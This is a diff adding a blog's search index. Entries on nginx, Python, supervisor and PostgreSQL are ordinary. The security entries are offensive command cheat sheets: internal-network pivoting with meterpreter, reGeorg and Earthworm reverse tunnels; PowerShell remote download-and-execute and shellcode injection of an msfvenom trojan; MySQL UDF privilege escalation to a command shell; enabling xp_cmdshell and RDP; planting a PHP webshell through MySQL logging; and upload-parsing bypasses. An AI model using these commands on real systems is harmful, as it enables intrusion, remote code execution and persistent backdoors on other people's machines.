@@ -1,0 +1,139 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[Nginx location规则]]></title>
+    <url>%2F2019%2F02%2F24%2Fnginx-location-e8-a7-84-e5-88-99%2F</url>
+    <content type="text"><![CDATA[官方文档:http://nginx.org/en/docs/http/ngx\_http\_core_module.html#location Syntax : location [ = | ~ | ~* | ^~ ] uri { ... } location @name { ... } Default: — Context: server, location =，^~，空，定义前缀字符串(普通location)(官网叫prefix locations) ~和~*(大小写不敏感)定义正则表达式（正则location） @定义一个命名的location，用于重定向 对于一个请求进行匹配，最先匹配普通location，并且最终(没有正则匹配前)的匹配结果为最长前缀匹配(从请求的开头开始，尽可能长的匹配) 接下来进行正则location匹配，根据在配置文件中的顺序，在第一次成功匹配时结束，并使用相应的配置，如果没有匹配，则用普通location的匹配结果 如果最大前缀匹配使用^~，则不进行后面的正则匹配 =表示精确匹配，一旦匹配，就结束 官网的例子: location = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* .(gif|jpg|jpeg)$ { [ configuration E ] } &#39;/&#39;匹配A &#39;/index.html&#39;匹配B &#39;/documents/document.html&#39;匹配C &#39;/images/1.gif&#39;匹配D &#39;/documents/1.jpg&#39;匹配E]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Python3 生成器]]></title>
+    <url>%2F2019%2F02%2F24%2Fpython3-e7-94-9f-e6-88-90-e5-99-a8%2F</url>
+    <content type="text"><![CDATA[在 Python 中，使用了 yield 的函数被称为生成器（generator）。在通过__next__() 调用生成器时，会执行到下一个yield停止，返回 yield 的值，在下一次执行 __next__() 方法时从当前位置继续运行，没有下一个yield时抛出StopIteration的异常。生成器可以用for循环迭代。 1.列表生成式将列表生成式的`[]`改成`()`，就创建了一个生成器 &gt;&gt;&gt; L = [x * x for x in range(10)] &gt;&gt;&gt; L [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] &gt;&gt;&gt; g = (x * x for x in range(10)) &gt;&gt;&gt; g &lt;generator object &lt;genexpr&gt; at 0x104feab40&gt; 2.函数含有`yield`关键字的函数被认为是生成器。 斐波拉契数列： def fib(max): n, a, b = 0, 0, 1 while n &lt; max: yield b a, b = b, a + b n = n + 1 3.___next__() and send() ___next__()，执行到下一个yield处，并返回值， send(val)，执行到下一个yield处，并返回值，val可以设置上一个yield表达式的返回值(m= yield 5)，yield 5这个表达式是没有返回值的，所以m=None，但是send(val)可以设置m=val，第一次运行next时在yield处返回，m没有被赋值，第二次执行send(val)时，从此处接着执行，设置m=val，并运行到下一个yield处 ___next__() == send(None) 生产者消费者问题：生产者生产-&gt;消费者消费-&gt;生产者生产… def consumer(): r = &apos;&apos; while True: n = yield r if not n: return print(&apos;[CONSUMER] Consuming %s...&apos; % n) r = &apos;200 OK&apos; def produce(c): c.send(None) n = 0 while n &lt; 5: n = n + 1 print(&apos;[PRODUCER] Producing %s...&apos; % n) r = c.send(n) print(&apos;[PRODUCER] Consumer return: %s&apos; % r) c.close() c = consumer() produce(c) 结果: [PRODUCER] Producing 1... [CONSUMER] Consuming 1... [PRODUCER] Consumer return: 200 OK [PRODUCER] Producing 2... [CONSUMER] Consuming 2... [PRODUCER] Consumer return: 200 OK [PRODUCER] Producing 3... [CONSUMER] Consuming 3... [PRODUCER] Consumer return: 200 OK [PRODUCER] Producing 4... [CONSUMER] Consuming 4... [PRODUCER] Consumer return: 200 OK [PRODUCER] Producing 5... [CONSUMER] Consuming 5... [PRODUCER] Consumer return: 200 OK]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Python3 MRO与super]]></title>
+    <url>%2F2019%2F02%2F19%2Fpython-mro-e4-b8-8esuper%2F</url>
+    <content type="text"><![CDATA[0x1 MRO二义性问题：派生类与基类中存在名字相同的数据或函数，使得无法判断与调用。例如，有两个基类A和B，A和B都定义了方法f()，C继承A和B，那么调用C的f()方法时会出现不确定。 MRO：method resolution order（方法解释顺序），主要用于在多继承时判断属性(成员变量/方法)的搜索顺序，解决二义性问题。通过拓扑排序实现。可通过内置__mro__或者mro()查看类的mro列表。 拓扑排序：对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边(u,v)∈E(G)，则u在线性序列中出现在v之前。实现步骤：选择一个入度为0的顶点并输出；从图中删除此顶点及所有出边。 此为一个多重继承关系图，首先选入度为0的元素A,再删除从A出去的边，此时B，C都是入度为0，从左到右选择，所以选择B并删除B的边,再接着就是E,C,D,F,最后是object,所以A的MRO列表为[A,B,E,C,D,F,object] 0x2 super的两种调用方式提供一个MRO以及一个MRO中的类C, super()将返回一个从MRO中C之后的类中查找方法的对象。 super(a_type, obj).func(),此时func是与obj绑定的,MRO 指的是 type(obj) 的 MRO, MRO 中的那个类就是 a_type , 同时 isinstance(obj, a_type) == True 。 super(type1, type2).func(),此时func未绑定,MRO 指的是 type2 的 MRO, MRO 中的那个类就是 type1 ，同时 issubclass(type2, type1) == True 。]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Supervisor]]></title>
+    <url>%2F2018%2F10%2F20%2Fsupervisor%2F</url>
+    <content type="text"><![CDATA[Supervisor是一个linux进程控制系统,让后台进程在会话结束的时候也照常运行，比如运行python flask应用 1.配置文件apt-get install supervisor安装完后，默认配置文件在/etc/supervisor/supervisord.conf echo_supervisord_conf 可以看到示例配置文件 [include] files = /etc/supervisor/conf.d/*.conf #该目录下增加我们自己的配置文件，在该配置文件中增加[program:x]部分，用来运行我们自己的程序 2.进程管理配置文件；/etc/supervisor/conf.d/test.conf [program:x] ;x是program名称 command =python test.py ;包含一个命令，当这个program启动时执行 directory = /home/si/ ;执行子进程时supervisord暂时切换到该目录 user = si ;用户 startsecs = 3 ;进程从STARING状态转换到RUNNING状态program所需要保持运行的时间 stdout_logfile_maxbytes = 50MB ;stdout_logfile指定日志文件最大字节数，默认为50MB，可以加KB、MB或GB等单位 stdout_logfile_backups = 10 ;要保存的stdout_logfile备份的数量 stdout_logfile = /home/si/1.log ;将进程stdout输出到指定文件 redirect_stderr=true ; 如果为true，则stderr的日志会被写入stdout日志文件中 numprocs=1 ; 启动进程的数目 autostart=true ; 如果是true的话，子进程将在supervisord启动后被自动启动 autorestart=unexpected ; 这个是设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected 和true。 如果为unexpected，只有当进程的退出码不在exitcodes里面定义的退 出码的时候，才会被自动重启。 exitcodes=0,2 startretries=3 ; 当进程启动失败后，最大尝试启动的次数 3.启动supervisord #启动supervisor服务端 #客户端 supervisorctl status #查看状态 supervisorctl reload #重新载入配置文件 supervisorctl start [all]|[name] #启动所有/指定的程序进程 supervisorctl stop [all]|[name] #关闭所有/指定的程序进程]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[学校多个系统的命令行客户端]]></title>
+    <url>%2F2018%2F09%2F16%2Fe5-ad-a6-e6-a0-a1-e5-a4-9a-e4-b8-aa-e7-b3-bb-e7-bb-9f-e7-9a-84-e5-91-bd-e4-bb-a4-e8-a1-8c-e5-ae-a2-e6-88-b7-e7-ab-af%2F</url>
+    <content type="text"><![CDATA[闲来无事,给学校多个系统写了个命令行客户端,目前可以进入教务网和sakai,对会话进行了缓存，各个系统之间切换非常快速便捷 项目传送门 0x1环境 Pipfile,Pipfile.lock中可以看到所有依赖信息 git clone https://github.com/taopeach1998/CQU.git pipenv –python 3 pipenv install pipenv shell python manage.py 0x2使用 当前教务网系统实现查成绩功能，sakai系统实现查看本学期课程未完成作业功能 help可以查看当前可用命令 help [命令] 可以查看命令使用方式 可以在conf/config.ini 中手动配置账号密码，也可以使用cconfig 命令配置 jww是教务网账号密码,com_login是统一认证登录账号密码 0x3插件 可以以插件的方式向现有的jww,sakai系统增加新的功能,只需要在plugin/sakai或者plugin/jww中添加文件即可 一个例子 &apos;&apos;&apos; :desc:这是一个测试 :usage: test &apos;&apos;&apos; def run(session,args): &apos;&apos;&apos; :param session: requests.Session对象,当前系统的会话 :param args:一个列表 &apos;&apos;&apos; print(&apos;this is a test!&apos;) 文件名字就是插件名字 :desc: 插件描述 :usage: 插件使用方式 run函数必须存在]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Python异步IO]]></title>
+    <url>%2F2018%2F09%2F09%2Fpython-e5-bc-82-e6-ad-a5io%2F</url>
+    <content type="text"><![CDATA[asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。 1.@ asyncio.coroutine/yield from `@asyncio.coroutine`把一个函数标记为协程 yield from针对耗时的操作进行挂起，函数让出控制权 import timeimport asyncioimport random now = lambda : time.time() @asyncio.coroutine def do_some_work(x): print(&quot;{} start&quot;.format(x)) yield from asyncio.sleep(2) print(&quot;{} end&quot;.format(x)) start = now() loop = asyncio.get_event_loop() tasks = [asyncio.ensure_future(do_some_work(i)) for i in range(10)] loop.run_until_complete(asyncio.wait(tasks)) print(&quot;Time:&quot;,now()-start) 2.async/await async代替`@asyncio.coroutine` await代替yield from import timeimport asyncioimport random now = lambda : time.time() async def do_some_work(x): print(&quot;{} start&quot;.format(x)) await asyncio.sleep(2) print(&quot;{} end&quot;.format(x)) start = now() loop = asyncio.get_event_loop() tasks = [asyncio.ensure_future(do_some_work(i)) for i in range(10)] loop.run_until_complete(asyncio.wait(tasks)) print(&quot;Time:&quot;,now()-start) 3.aiohttpimport asyncio import aiohttp async def task(url): print(&apos;start {}&apos;.format(url)) async with aiohttp.ClientSession() as session: async with session.get(url) as resp: content=await resp.text() print(&apos;{1} bytes from {0}&apos;.format(url,len(content))) urls=[&apos;https://github.com/&apos;,&apos;https://www.baidu.com/&apos;,&apos;https://www.python.org/&apos;] event_loop=asyncio.get_event_loop() tasks=[asyncio.ensure_future(task(i)) for i in urls] event_loop.run_until_complete(asyncio.wait(tasks)) 4.gevent python通过yield提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。 monkey.patch_all()将python的一些标准库(thread/socket等)改成非阻塞 遇到io阻塞自动挂起，执行其他任务 from gevent import monkeymonkey.patch_all()import geventfrom urllib import request def f(url): print(&apos;GET: %s&apos; % url) resp = request.urlopen(url) data = resp.read() print(&apos;%d bytes received from %s.&apos; % (len(data), url)) gevent.joinall([ gevent.spawn(f, &apos;https://github.com/&apos;), gevent.spawn(f, &apos;https://www.baidu.com/&apos;), gevent.spawn(f, &apos; https://www.python.org/&apos;), ])]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[绕过CDN查找真实ip]]></title>
+    <url>%2F2018%2F09%2F02%2Fe7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip%2F</url>
+    <content type="text"><![CDATA[可通过多地ping的方法，判断是否加了cdn 内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。 扫描测试文件，如phpinfo，test等 子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip 国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了 域名的解析记录。通过在线网站（http://site.ip138.com） ，查询域名的历史解析记录和当前解析记录 app。目标网可能有自己的app，通过抓包可能获得到目标真实ip]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[flask+nginx+uwsgi配置]]></title>
+    <url>%2F2018%2F08%2F12%2Fflasknginxuwsgi-e9-85-8d-e7-bd-ae%2F</url>
+    <content type="text"><![CDATA[uwsgi配置（.ini）[uwsgi] socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写 wsgi-file = manage.py #项目启动文件 callable = app #主应用名 processes = 4 #开启进程数 buffer-size = 65535 master = true #允许uwsgi主进程 plugins = python #解决python与uwsgi兼容问题 #sudo apt-get install uwsgi-plugin-python uid=1000 #设置运行用户uid/用户名 gid=1000 #用户组id disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中 logto =uwsgi_web.log virtualenv＝/home/proj/virtualenv #python虚拟环境 nginx配置server { listen 1234;#web服务监听端口 server_name 0.0.0.0;#域名/ip location / { include uwsgi_params; uwsgi_pass 127.0.0.1:5001;#uwsgi监听的端口或者socket文件，unix:/tmp/uwsgi.sock,nginx需要有对文件的写权限 } }]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[内网渗透之进入内网]]></title>
+    <url>%2F2018%2F08%2F05%2Fe5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91%2F</url>
+    <content type="text"><![CDATA[1.msf拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网 meterpreter&gt;run get_local_subnets //获取子网/子网掩码 添加路由 meterpreter&gt;run autoroute -s 子网/子网掩码 或 msf&gt;route add 子网 子网掩码 seesion_id 内网主机存活扫描 meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 使nmap等工具也可以扫描内网 1.scoks4代理（支持tcp,sock5支持tcp/udp） use auxiliary/server/socks4a 2.proxychains/proxifier等全局代理软件 proxychains4 nmap -sT ip 2.proxychains/proxifier+reGeorg1.上传tunnel脚本到靶机 2.python reGeorgSocksProxy.py -u http://ip/tunnel //开启socks服务 3.配置proxychains/proxifier使用socks服务 3.Earthworm(socks5代理)1.正向，在靶机开启socks服务 ew –s ssocksd –l 888 2.反向 本机添加一个转接隧道，把1080端口收到的代理请求转交给888端口 ew -s rcsocks -l 1008 -e 888 在靶机上开启socks服务，并反弹到本机888端口上 ew -s rssocks -d 本机ip -e 888 接下来就可以配置全局代理软件访问本机1008端口使用靶机socks服务了]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Nishang/PowerSploit]]></title>
+    <url>%2F2018%2F08%2F05%2Fnishang-powersploit%2F</url>
+    <content type="text"><![CDATA[nishang/powersploit都是针对powershell的渗透工具，提供了丰富powershell脚本，在后渗透的时候，不需要在靶机上上传任何工具，只要一个powershell，就可以远程下载执行脚本 1.Powershell查看执行策略 Get-ExecutionPolicy Restricted //这是默认的设置。不能执行PowerShell脚本 AllSigned //只有数字签名的脚本将会运行，此外，会提示你允许运行那些使用指定的证书签名的脚本 RemoteSigned //经本地编写的脚本将会运行，从网络下载的脚本运行，除非他们签名了并且你批准了的签名的证书 UnRestricted //所有的脚本都将运行 设置执行策略，需要管理员权限 set-ExecutionPolicy 绕过执行策略执行脚本 PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 //远程下载执行 IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;) 在cmd模式下: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;) powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)&quot; 2.Nishang导入所有模块nishang import-module ./nishang.psm1 get-command -module nishang //查看命令 单独导入Invoke-PortScan脚本 IEX (New-Object Net.WebClient).DownloadString(“http://localhost/webTools/nishang/Scan/Invoke-PortScan.ps1”) get-help Invoke-PortScan //查看使用方法 nishang提供了丰富的脚本 3.PowerSploit 用法和nishang一样，有些重叠脚本 Invoke-Shellcode:将shellcode插入您选择的进程ID或本地PowerShell中 IEX (New-Object Net.WebClient).DownloadString(“http://Invoke-Shellcode.ps1”) //导入Invoke-Shellcode脚本 IEX (New-Object Net.WebClient).DownloadString(“http://msf.ps1”) //导入msfvenom生成的木马 Invoke-Shellcode -Shellcode ($buf) //直接运行 Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[windows提权对照表]]></title>
+    <url>%2F2018%2F08%2F03%2Fwindows-e6-8f-90-e6-9d-83-e5-af-b9-e7-85-a7-e8-a1-a8%2F</url>
+    <content type="text"><![CDATA[exp下载地址 #Security Bulletin #KB #Description #Operating System CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) MS15-097 [KB3089656] [remote code execution] (win8.1/2012) MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) MS14-070 [KB2989935] [Kernel Driver] (2003) MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) MS14-002 [KB2914368] [NDProxy] (2003/XP) MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) MS11-080 [KB2592799] [AFD.sys] (2003/XP) MS11-062 [KB2566454] [NDISTAPI] (2003/XP) MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) MS10-092 [KB2305420] [Task Scheduler] (2008/7) MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) MS08-068 [KB957097] [Remote Code Execution] (2000/XP) MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003) MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[cmd开启3389]]></title>
+    <url>%2F2018%2F07%2F29%2Fcmd-e5-bc-80-e5-90-af3389%2F</url>
+    <content type="text"><![CDATA[win2003 wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1 win2003，xp REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Mysql udf提权]]></title>
+    <url>%2F2018%2F07%2F29%2Fmysql-udf-e6-8f-90-e6-9d-83%2F</url>
+    <content type="text"><![CDATA[1.（前期准备）得到udf.dll 16进制先在本地用udf专用马将udf.dll导出 select hex(load_file(&apos;C:\\Users\\si\\Desktop\\udf.dll&apos;)) into dumpfile &apos;C:\\Users\\si\\Desktop\\udf.txt&apos; 得到udf.dll的16进制（outfile 函数会在行末端写入新行，还会转义换行符，导致2进制可执行文件会被破坏，而dumpfile函数不对任何列或行进行终止，也不执行任何转义处理，所以可以得到一个完整的可执行文件） 2.在靶机将udf.dll导出到相应目录 mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/ mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\ 导出udf.dll(xxx就是上一步得到的udf.dll的16进制) select unhex(&apos;xxxx&apos;) into dumpfile &apos;c:/windows/system32/udf.dll&apos; 使用NTFS ADS流创建lib、plugin文件夹 select @@basedir; //查找mysql的目录 select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib::$INDEX_ALLOCATION&apos;; //使用NTFS ADS流创建lib目录 select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib/plugin::$INDEX_ALLOCATION&apos;; //利用NTFS ADS再次创建plugin目录 3.创建函数/执行命令create function cmdshell returns string soname &apos;udf.dll&apos;; select cmdshell(&apos;whoami&apos;); drop function cmdshell; 删除函数 delete from mysql.func where name=&apos;cmdshell&apos; 删除函数]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Mssql开启xp_cmdshell]]></title>
+    <url>%2F2018%2F07%2F29%2Fmssql-e5-bc-80-e5-90-afxp-cmdshell%2F</url>
+    <content type="text"><![CDATA[关闭EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项 RECONFIGURE; EXEC sp_configure &apos;xp_cmdshell&apos;,0; RECONFIGURE; 开启EXEC sp_configure &apos;show advanced options&apos;, 1; RECONFIGURE; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; RECONFIGURE; 在注入点运行上述语句时,如果出现这样的回显,标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在,可执行以下语句 EXEC sp_configure &apos;show advanced options&apos;,1; RECONFIGURE; EXEC sp_configure &apos;user connections&apos;,1; RECONFIGURE;]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[Mysql日志拿shell]]></title>
+    <url>%2F2018%2F07%2F29%2Fmysql-e6-97-a5-e5-bf-97-e6-8b-bfshell%2F</url>
+    <content type="text"><![CDATA[set global general_log = on; set global general_log_file = &apos;C:/phpStudy/WWW/sinight.php&apos;; select &apos;&lt;?php @assert($_POST[&quot;sinight&quot;]); ?&gt;&apos;; set global general_log = off;]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[linux postgresql 使用]]></title>
+    <url>%2F2018%2F07%2F27%2Flinux-postgresql-e4-bd-bf-e7-94-a8%2F</url>
+    <content type="text"><![CDATA[正常情况下，安装完成后，PostgreSQL服务器会自动在本机的5432端口开启。 初次安装后，默认生成一个名为postgres的数据库和一个名为postgres的数据库用户同时还生成了一个名为postgres的Linux系统用户。 1.创建数据库1.使用postgresql控制台创建切换到postgres用户 su postgres 下一步，使用psql命令登录PostgreSQL控制台。 psql 这时相当于系统用户postgres以同名数据库用户的身份，登录同名数据库，这是不用输入密码的。 完整命令 psql -d 数据库名称 -U 用户名称 --password 密码 使用\password命令，为postgres用户设置一个密码。 \password postgres 创建数据库用户test，并设置密码。 CREATE USER test WITH PASSWORD &apos;password&apos;; 创建用户数据库，这里为exampledb，并指定所有者为test。 CREATE DATABASE exampledb OWNER test; 将exampledb数据库的所有权限都赋予test，否则test只能登录控制台，没有任何数据库操作权限。 GRANT ALL PRIVILEGES ON DATABASE exampledb to test; 2.使用shell命令行PostgreSQL提供了命令行程序createuser和createdb。 创建数据库用户test，并指定其为超级用户。 sudo -u postgres createuser --superuser test 创建数据库exampledb sudo -u postgres createdb -O dbuser exampledb 2.删除数据库命令行 sudo -u postgres dropdb test psql sudo -u postgres psql DROP DATABASE test; 3.psql的一些命令\q:退出 \password:设置密码 \h：查看SQL命令的解释，比如\h select。 \?：查看psql命令列表。 \l：列出所有数据库。 \c [database_name]：连接其他数据库。 \d：列出当前数据库的所有表格。 \d [table_name]：列出某一张表格的结构。 \du：列出所有用户。 \e：打开文本编辑器。 \conninfo：列出当前数据库和连接的信息。]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[web容器上传文件利用方式总结]]></title>
+    <url>%2F2018%2F06%2F22%2Fweb-e5-ae-b9-e5-99-a8-e4-b8-8a-e4-bc-a0-e6-96-87-e4-bb-b6-e5-88-a9-e7-94-a8-e6-96-b9-e5-bc-8f-e6-80-bb-e7-bb-93%2F</url>
+    <content type="text"><![CDATA[1.IIS 6.01)在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。 /1.asp/1.jpg 2)分号后面的不被解析 1.asp;.jpg 3)IIS6.0 默认的可执行文件除了asp还包含asa,cer,cdx 2.IIS写权限用curl -i -X OPTIONS www.example.com 测试是否支持PUT 3.php CGI解析漏洞(nginx/ii7.0/iis7.5等)在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。 1.jpg/xxx.php可以执行 4.Nginx空字节代码执行(php)漏洞Ngnix在遇到%00空字节时与后端FastCGI处理不一致 nginx 0.5. nginx 0.6. nginx 0.7 &lt;= 0.7.65 nginx 0.8 &lt;= 0.8.37 1.jpg%00.php可执行 5.Apache(1.x/2.x)解析漏洞1) Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 1.php.xxx可执行 2)上传.htaccess,使jpg可执行 SetHandler application/x-httpd-php 6.Windows在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 可以通过1.php. , 1.php[空格]绕过黑名单]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+</search>
